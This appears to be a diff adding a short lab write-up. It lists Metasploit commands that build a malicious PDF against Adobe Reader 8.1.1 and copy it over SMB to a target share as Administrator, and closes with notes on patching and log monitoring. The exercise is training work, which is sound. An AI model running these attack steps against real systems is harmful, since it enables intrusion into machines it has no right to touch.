@@ -1,0 +1,13 @@
+# Metasploit commands to exploit the vulnerable application
+msfconsole
+search adobe 8.1.1
+use 0
+show options
+exploit
+
+# Copy the malicious PDF to the target system using SMB
+cp /home/aciadmin/.msf4/local/msf.pdf .
+smbclient //192.168.0.3/Module_3_Folder -U Administrator
+
+Conclusion:
+This exercise showed how attackers can exploit vulnerabilities in outdated applications and how critical it is to monitor logs for indicators of attack. Keeping software updated and being vigilant about attack vectors are key practices in network security. This task reinforced my skills in using Metasploit and monitoring event logs for malicious activity.
